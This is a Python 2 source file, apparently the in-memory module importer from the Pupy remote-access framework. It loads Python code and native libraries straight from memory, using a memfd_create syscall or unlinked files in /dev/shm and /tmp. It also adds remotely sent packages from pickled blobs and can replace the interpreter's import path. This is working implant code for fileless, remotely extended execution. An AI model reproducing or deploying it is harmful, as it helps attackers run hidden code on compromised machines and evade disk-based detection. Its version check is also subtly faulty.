# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------
# This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
# Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
#
import sys, imp, marshal

__debug = False;

def dprint(msg):
    global __debug
    if __debug:
        print msg

try:
    import _memimporter
    builtin_memimporter = True
    allow_system_packages = False
except ImportError:
    builtin_memimporter = False
    allow_system_packages = True
    import ctypes
    import platform
    import pkg_resources
    libc = ctypes.CDLL(None)
    syscall = libc.syscall
    from tempfile import mkstemp
    from os import chmod, unlink, close, write

    class MemImporter(object):
        def __init__(self):
            self.dir = None
            self.memfd = None
            self.ready = False

            if platform.system() == 'Linux':
                maj, min = platform.release().split('.')[:2]
                if maj >= 3 and min >= 13:
                    __NR_memfd_create = None
                    machine = platform.machine()
                    if machine == 'x86_64':
                        __NR_memfd_create = 319
                    elif machine == '__i386__':
                        __NR_memfd_create = 356

                    if __NR_memfd_create:
                        self.memfd = lambda: syscall(__NR_memfd_create, 'heap', 0x1)
                        self.ready = True
                        return

            for dir in ['/dev/shm', '/tmp', '/var/tmp', '/run']:
                try:
                    fd, name = mkstemp(dir=dir)
                except:
                    continue

                try:
                    chmod(name, 0777)
                    self.dir = dir
                    self.ready = True
                    break

                finally:
                    close(fd)
                    unlink(name)

        def import_module(self, data, initfuncname, fullname, path):
            fd = -1
            closefd = True
            if self.memfd:
                fd = self.memfd()
                if fd != -1:
                    name = '/proc/self/fd/{}'.format(fd)
                    closefd = False

            if fd == -1:
                fd, name = mkstemp(dir=self.dir)

            try:
                write(fd, data)
                imp.load_dynamic(fullname, name)

            except:
                self.dir = None

            finally:
                if closefd:
                    close(fd)
                    unlink(name)

    _memimporter = MemImporter()
    builtin_memimporter = _memimporter.ready

modules = {}

try:
    import pupy
    if not (hasattr(pupy, 'pseudo') and pupy.pseudo) and not modules:
        modules = pupy.get_modules()
except ImportError:
    pass

def get_module_files(fullname):
    """ return the file to load """
    global modules
    path = fullname.replace('.','/')

    files = [
        module for module in modules.iterkeys() \
        if module.rsplit(".",1)[0] == path or any([
            path+'/__init__'+ext == module for ext in [
                '.py', '.pyc', '.pyo'
            ]
        ])
    ]

    if len(files) > 1:
        # If we have more than one file, than throw away dlls
        files = [ x for x in files if not x.endswith('.dll') ]

    return files

def pupy_add_package(pkdic, compressed=False):
    """ update the modules dictionary to allow remote imports of new packages """
    import cPickle
    import zlib

    global modules

    if compressed:
        pkdic = zlib.decompress(pkdic)

    module = cPickle.loads(pkdic)

    if __debug:
        print 'Adding files: {}'.format([ x for x in module.iterkeys() ])

    modules.update(module)

def has_module(name):
    global module
    return name in sys.modules

def invalidate_module(name):
    global module
    if not name in sys.modules:
        raise ValueError('Module {} is not loaded yet'.format(name))

    del sys.modules[name]

def native_import(name):
    __import__(name)

class PupyPackageLoader:
    def __init__(self, fullname, contents, extension, is_pkg, path):
        self.fullname = fullname
        self.contents = contents
        self.extension = extension
        self.is_pkg=is_pkg
        self.path=path
        self.archive="" #need this attribute

    def load_module(self, fullname):
        imp.acquire_lock()
        try:
            dprint('loading module {}'.format(fullname))
            if fullname in sys.modules:
                return sys.modules[fullname]

            mod=None
            c=None
            if self.extension=="py":
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = '<memimport>/{}'.format(self.path)
                mod.__loader__ = self
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname]=mod
                code = compile(self.contents, mod.__file__, "exec")
                exec code in mod.__dict__
            elif self.extension in ["pyc","pyo"]:
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = '<memimport>/{}'.format(self.path)
                mod.__loader__ = self
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname]=mod
                c=marshal.loads(self.contents[8:])
                exec c in mod.__dict__
            elif self.extension in ("dll", "pyd", "so"):
                initname = "init" + fullname.rsplit(".",1)[-1]
                path = self.fullname.rsplit('.', 1)[0].replace(".",'/') + "." + self.extension
                dprint('Loading {} from memory'.format(fullname))
                dprint('init={} fullname={} path={}'.format(initname, fullname, path))
                mod = _memimporter.import_module(self.contents, initname, fullname, path)
                if mod:
                    mod.__name__=fullname
                    mod.__file__ = '<memimport>/{}'.format(self.path)
                    mod.__loader__ = self
                    mod.__package__ = fullname.rsplit('.',1)[0]
                    sys.modules[fullname]=mod

        except Exception as e:
            if fullname in sys.modules:
                del sys.modules[fullname]

            import traceback
            exc_type, exc_value, exc_traceback = sys.exc_info()
            traceback.print_tb(exc_traceback)
            dprint('PupyPackageLoader: '
                       'Error while loading package {} ({}) : {}'.format(
                           fullname, self.extension, str(e)))
            raise e

        finally:
            imp.release_lock()

        return sys.modules[fullname]

class PupyPackageFinder:
    def __init__(self, modules):
        self.modules = modules

    def find_module(self, fullname, path=None):
        imp.acquire_lock()
        try:
            files=[]
            if fullname in ( 'pywintypes', 'pythoncom' ):
                fullname = fullname + '27.dll'
                files = [ fullname ]
            else:
                files = get_module_files(fullname)

            dprint('find_module({},{}) in {})'.format(fullname, path, files))
            if not builtin_memimporter:
                files = [
                    f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
                ]

            if not files:
                dprint('{} not found in {} - no files'.format(fullname,path))
                return None

            criterias = [
                lambda f: any([
                    f.endswith('/__init__'+ext) for ext in [
                        '.pyo', '.pyc', '.py'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyo', '.pyc'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyd', '.py', '.so', '.dll'
                    ]
                ]),
            ]

            selected = None
            for criteria in criterias:
                for pyfile in files:
                    if criteria(pyfile):
                        selected = pyfile
                        break

            if not selected:
                dprint('{} not found in {}: not in {} files'.format(
                    fullname, selected, len(files)))
                return None

            dprint('{} found in {}'.format(fullname, selected))
            content = self.modules[selected]

            # Don't delete network.conf module
            if not selected.startswith('network/'):
                dprint('{} remove {} from bundle'.format(fullname, selected))
                del self.modules[selected]

            extension = selected.rsplit(".",1)[1].strip().lower()
            is_pkg = any([
                selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]
            ])

            dprint('--> Loading {} ({}) package={}'.format(
                fullname, selected, is_pkg))

            return PupyPackageLoader(fullname, content, extension, is_pkg, selected)

        except Exception as e:
            dprint('--> Loading {} failed: {}'.format(fullname, e))
            raise e

        finally:
            imp.release_lock()

def install(debug=False):
    global __debug
    __debug = debug

    if allow_system_packages:
        sys.meta_path.append(PupyPackageFinder(modules))
    else:
        sys.meta_path = [ PupyPackageFinder(modules) ]
        sys.path = []
        sys.path_importer_cache.clear()

    if 'win' in sys.platform:
        import pywintypes
    if __debug:
        print 'Bundled modules:'
        for module in modules.iterkeys():
            print '+ {}'.format(module)
